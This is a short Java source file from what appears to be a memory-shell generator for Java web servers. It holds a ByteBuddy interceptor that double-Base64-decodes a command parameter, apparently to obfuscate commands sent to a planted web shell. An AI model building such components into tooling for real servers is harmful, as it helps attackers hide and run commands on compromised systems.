package com.reajason.javaweb.memshell.generator.command;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

/**
 * @author ReaJason
 * @since 2025/4/27
 */
public class DoubleBase64ParamInterceptor {

    @Advice.OnMethodExit
    public static void enter(@Advice.Argument(value = 0) String param, @Advice.Return(readOnly = false) String returnValue) throws Exception {
        returnValue = ShellCommonUtil.base64DecodeToString(ShellCommonUtil.base64DecodeToString(param));
    }
}
